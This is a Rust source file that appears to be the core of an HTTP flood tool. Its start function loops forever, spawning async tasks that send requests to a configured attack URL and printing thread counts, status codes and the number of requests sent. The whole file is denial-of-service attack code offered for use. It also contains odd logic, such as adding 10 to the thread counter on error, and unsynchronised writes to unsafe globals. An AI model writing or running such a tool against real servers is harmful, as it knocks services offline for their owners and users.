
use crate::extra_fn;
use crate::ram_manger::{SAFE_PUB_VAR, UNSAFE_PUB_VAR};
use crate::where_attack::AttackData;

pub async fn start(passed_var: AttackData) {
    loop {
        core_attack(&passed_var);
    }
}

fn core_attack(passed_var: &AttackData) {
    let error_threads = SAFE_PUB_VAR.lock();
    match error_threads {
        Err(e) => {
            println!("error when starting thread: {}", e)
        }
        Ok(mut threads) => {
            if threads.thread_on + 1 < passed_var.threads {
                threads.thread_on += 1;
                unsafe {
                    UNSAFE_PUB_VAR.threads_on += 1;
                }
                drop(threads);
                tokio::spawn(async {
                    unsafe {
                        let error_data = extra_fn::request(&UNSAFE_PUB_VAR.attack_url);
                        match error_data.await {
                            Ok(status_code) => {
                                let wait = modify_pub_data(true);
                                UNSAFE_PUB_VAR.amount_sent += 1;
                                println!(
                                    "Threads on {},\n Status code {},\n Request sent {}",
                                    UNSAFE_PUB_VAR.threads_on,
                                    status_code.status(),
                                    UNSAFE_PUB_VAR.amount_sent,
                                );
                                wait.await;
                            }
                            Err(data) => {
                                let wait = modify_pub_data(false);
                                println!(
                                    "Threads on {}, Status ERROR {}\n Request sent {}",
                                    UNSAFE_PUB_VAR.threads_on,
                                    data,
                                    UNSAFE_PUB_VAR.amount_sent
                                );
                                wait.await;
                            }
                        }
                    }
                });
            }
        }
    }
}


async unsafe fn modify_pub_data(add: bool) {
    loop {
        if let Ok(mut data) = SAFE_PUB_VAR.lock() {
            if add {
                data.thread_on -= 1;
            } else {
                UNSAFE_PUB_VAR.threads_on -= 1;
                data.thread_on += 10;
            }
            break;
        }
    }
}